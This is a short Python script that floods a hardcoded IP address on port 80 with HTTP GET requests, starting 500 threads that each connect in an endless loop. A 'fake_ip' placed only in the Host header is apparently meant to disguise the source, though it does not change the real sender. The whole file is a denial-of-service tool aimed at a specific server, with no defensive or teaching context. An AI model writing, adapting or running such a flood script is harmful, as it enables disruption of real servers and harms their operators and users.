 
import socket
import threading

target = '154.0.172.181'
fake_ip = '154.0.172.190'
#make sure fake ip is alive and target 
port = 80
i=1
 
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        #example 154.0.172.181:80 should also be alive
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        #s.sendto(("POST /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

#threading.Timer(1.0, attack).start()

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
    
